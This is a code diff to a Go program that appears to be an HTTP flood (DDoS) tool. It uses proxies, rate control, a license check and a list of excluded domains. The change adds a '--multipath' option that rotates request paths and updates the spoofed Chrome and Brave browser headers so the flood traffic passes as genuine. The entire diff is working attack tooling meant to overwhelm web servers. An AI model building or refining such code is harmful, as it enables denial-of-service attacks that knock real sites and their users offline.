@@ -14,6 +14,7 @@ import (
 	"strings"
 	"sync"
 	"sort"
+	"sync/atomic"
 	"time"
 
 	http "github.com/bogdanfinn/fhttp"
@@ -99,7 +100,9 @@ var (
 	statusMap        = make(map[int]int)
 	customHeaders    = make(map[string]string)
 	licenseVerified  = false
- wg sync.WaitGroup
+	paths []string
+	currentPathIndex int32
+	wg sync.WaitGroup
 
 	blockedDomains = []string{".gov", ".by", ".ua", ".edu", ".int", ".mil"}
 
@@ -242,7 +245,7 @@ func main() {
 		fmt.Println("[#6] Ratelimit must be between 0.1 and 128")
 		os.Exit(1)
 	}
-
+	paths = []string{""} 
 	for i := 0; i < len(os.Args); i++ {
 		switch os.Args[i] {
 		case "--debug":
@@ -273,6 +276,10 @@ func main() {
 			}
 		case "--http1":
 			usehttp1 = true
+		case "--multipath":
+			if i+1 < len(os.Args) {
+				paths = strings.Split(os.Args[i+1], "@")
+			}
 		}
 	}
 
@@ -410,7 +417,7 @@ func randomHeader() http.Header {
 			"Host": 					 []string{domain},
 			"Connection": 			     []string{"keep-alive"},
 			"Cache-Control":             []string{"max-age=0"},
-			"sec-ch-ua":                 []string{`"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"`},
+			"sec-ch-ua":                 []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
 			"sec-ch-ua-mobile":          []string{"?0"},
 			"sec-ch-ua-platform":        []string{`"Windows"`},
 			"Upgrade-Insecure-Requests": []string{"1"},
@@ -424,12 +431,12 @@ func randomHeader() http.Header {
 		if customUserAgent != "" {
 			header.Set("user-agent", customUserAgent)
 		} else {
-			header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`)
+			header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36`)
 		}
 	} else {
 		header = http.Header{
 			"cache-control":             []string{"max-age=0"},
-			"sec-ch-ua":                 []string{`"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"`},
+			"sec-ch-ua":                 []string{`"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"`},
 			"sec-ch-ua-mobile":          []string{"?0"},
 			"sec-ch-ua-platform":        []string{`"Windows"`},
 			"upgrade-insecure-requests": []string{"1"},
@@ -446,7 +453,7 @@ func randomHeader() http.Header {
 		if customUserAgent != "" {
 			header.Set("user-agent", customUserAgent)
 		} else {
-			header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`)
+			header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36`)
 		}
 	}
 
@@ -584,6 +591,14 @@ func createRatePattern(rps float64) []time.Duration {
 	return intervals
 }
 
+
+func getCurrentPath() string {
+	// Получаем текущий индекс и увеличиваем его атомарно
+	index := atomic.AddInt32(&currentPathIndex, 1) - 1
+	// Рассчитываем фактический индекс с учетом циклического прохождения
+	return paths[index%int32(len(paths))]
+}
+
 func start(proxy string) {
 	proxyType := detectProxyType(proxy)
 
@@ -693,10 +708,13 @@ func start(proxy string) {
 		}
 	}
 
-    req, err := http.NewRequest(reqmethod, target, nil)
+	currentPath := getCurrentPath()
+	fullTarget := target + currentPath
+
+	req, err := http.NewRequest(reqmethod, fullTarget, nil)
     if err != nil {
 		updateErrorCounters(err) 
-        return nil
+        return 
     }
 
     req.Header = randomHeader()
@@ -708,7 +726,7 @@ func start(proxy string) {
 
     resp, err := client.Do(req)
     if err != nil {
-        return nil
+        return 
     }
     defer resp.Body.Close()
 
